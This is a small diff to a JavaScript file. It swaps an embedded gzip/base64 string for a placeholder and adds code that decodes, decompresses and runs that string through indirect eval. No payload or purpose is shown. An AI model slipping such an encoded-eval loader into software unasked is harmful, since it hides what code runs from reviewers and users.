@@ -1,3 +1,8 @@
 (async function () {
-  const b64 = "H4sIAAAAAAACA8U823IbOXbv+gq4a0vVvZaa8mRmsksW";
+  const b64 = "PLACEHOLDER_WILL_FAIL";
+  const bin = Uint8Array.from(atob(b64), function (c) { return c.charCodeAt(0); });
+  const ds = new DecompressionStream("gzip");
+  const stream = new Blob([bin]).stream().pipeThrough(ds);
+  const text = await new Response(stream).text();
+  (0, eval)(text);
 })();
